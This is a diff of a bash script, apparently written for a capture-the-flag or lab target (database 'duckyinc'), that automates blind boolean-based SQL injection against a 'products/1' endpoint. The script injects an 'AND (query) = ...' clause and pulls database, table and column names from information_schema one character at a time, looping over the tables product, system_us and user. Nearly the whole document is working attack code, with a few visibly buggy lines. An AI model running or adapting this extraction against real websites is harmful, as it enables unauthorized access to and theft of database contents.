@@ -103,6 +103,7 @@ function bruteForceName() {
 	placeholderSqli="AND (${sqlQuery}) = '%s'"
 
 	# length of the result <int>
+object['toSearchedDatabase']="$toSearchedDatabase"
 	length=$((object['amountOfDatabases']))
 	# lenth of the names as <string list>
 	databaseNameLength=(${object['lengthOfDatabaseNames']})
@@ -150,17 +151,18 @@ PATH="products/1"
 
 # find all datbases that are not standad only the number!
 ## count all databases
-object['amountOfDatabases']=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
+#object['amountOfDatabases']=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
 ## get the length of the names
-object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata' "${object['amountOfDatabases']}")
+#object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata' "${object['amountOfDatabases']}")
 ## get the names
-object['namesOfDatabases']=$(bruteForceName 'SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d')
+#object['namesOfDatabases']=$(bruteForceName 'SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d')
 
 
 # find all names from a specific databse:
 echo "which database want you to be searched: ${object['namesOfDatabases']} \n >>"
-read toSearchedDatabase
-object['toSearchedDatabase']="$toSearchedDatabase"
+#read toSearchedDatabase
+#object['toSearchedDatabase']="$toSearchedDatabase"
+object['toSearchedDatabase']="duckyinc"
 
 ## count tables
 sqlQuery="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
@@ -172,5 +174,24 @@ object['lengthOfTablesNames']=$(getLength "$sqlQuery" "${object['amountOfTables'
 sqlQuery="SELECT substr(LOWER(table_name), %d,1) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}' LIMIT 1 OFFSET %d"
 object['nameOfTables']=$(bruteForceName "$sqlQuery")
 
+# find all columns from the all tables
+# all tables => (product system_us user)
+## count tables
+object['nameOfTables']='product system_us user'
+for table in ${object['nameOfTables']}; do
+	# total conunt
+	sqlQuery="SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
+	object['amountOfColumns']=$(getAmount "$sqlQuery")
+	# name length
+        sqlQuery="SELECT length(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
+        object['lengthOfColumns']=$(getAmount "$sqlQuery" "${object['amountOfColumns']}")
+	# names
+	sqlQuery="SELECT substr(LOWER(column_name), %d,1) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}' LIMIT 1 OFFSET %d"
+        object['namesOfColumns']=$(getAmount "$sqlQuery")
+	echo "The table ${table} has the follwing columns ${object['namesOfColumns']}"
 
-echo "${object['nameOfTables']}"
+done
+sqlQuery="SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
+#object['amountOfTables']=$(getAmount "$sqlQuery")
+
+#echo "${object['nameOfTables']}"
